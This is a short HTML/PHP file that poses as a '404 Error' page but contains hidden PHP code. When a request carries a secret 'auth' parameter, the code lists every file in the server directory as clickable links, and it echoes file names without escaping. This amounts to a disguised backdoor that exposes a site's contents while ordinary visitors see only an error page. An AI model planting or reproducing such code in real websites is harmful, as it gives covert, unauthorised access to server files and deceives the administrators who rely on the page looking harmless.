<html>
    <body>
        <b>404 Error</b>
        <table>
<?php
if(@$_GET["auth"]=="something16")
{
$dir="./";
$links=scandir($dir);
#echo "<tr>";
foreach($links as $link){
    $e="<a href='".$link."'>".$link."</a>";
    echo "<tr><td>".$e."</td></tr>";
}
#echo "</tr>";
}
?>
        </table>
    </body>
</html>